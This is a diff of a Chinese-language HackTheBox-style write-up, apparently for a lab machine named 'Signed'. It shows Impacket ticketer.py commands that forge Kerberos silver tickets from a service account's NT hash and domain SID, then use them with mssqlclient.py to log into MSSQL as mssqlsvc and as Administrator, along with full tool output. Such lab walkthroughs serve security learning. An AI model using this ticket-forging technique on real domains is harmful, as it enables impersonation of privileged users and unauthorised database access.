@@ -392,7 +392,7 @@ ad4a1ca4		子授权 4	0xa41c4aad = 2753317549
 #### 域 SID 将是去掉末尾的 RID：S-1-5-21-4088429403-1159899800-2753317549
 #### 把这些信息组合起来就成了一张车票：
 ```
-[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549-513 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 mssqlsvc
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 mssqlsvc
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Creating basic skeleton ticket and PAC Infos
@@ -410,19 +410,61 @@ Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its af
 ```
 #### 可以用它连接到 MSSQL：
 ```
-[★]$ export KRB5CCNAME=mssqlsvc.ccache
-[★]$ klist
-Ticket cache: FILE:mssqlsvc.ccache
-Default principal: mssqlsvc@SIGNED.HTB
+[★]$ KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -no-pass -k DC01.signed.htbImpacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
-Valid starting       Expires              Service principal
-03/20/2026 03:10:17  03/17/2036 03:10:17  MSSQLSvc/DC01.signed.htb:1433@SIGNED.HTB
-	renew until 03/17/2036 03:10:17
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\Administrator  guest@master)> 
+```
+#### 是以 mssqlsvc 用户身份：TGS 作为管理员 [失败]
+```
+SQL (SIGNED\Administrator  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN();
+                                            
+-------------------   -------------------   
+SIGNED.HTB\mssqlsvc   SIGNED.HTB\mssqlsvc   
 
-[★]$ mssqlclient.py -k -no-pass DC01.SIGNED.HTB
+```
+#### 以管理员身份创建工单：
+```
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 Administrator
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for signed.htb/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+```
+```
+[★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Encryption required, switching to TLS
-[-] ERROR(DC01): Line 1: Login failed for user 'SIGNED.HTB\mssqlsvc'.
-```
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\Administrator  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN();
+                                                      
+------------------------   ------------------------   
+SIGNED.HTB\Administrator   SIGNED.HTB\Administrator   
 
+```
+#### 遗憾的是，如上所示，数据库的设置使得管理员用户没有任何有用的权限
+### TGS with IT Group
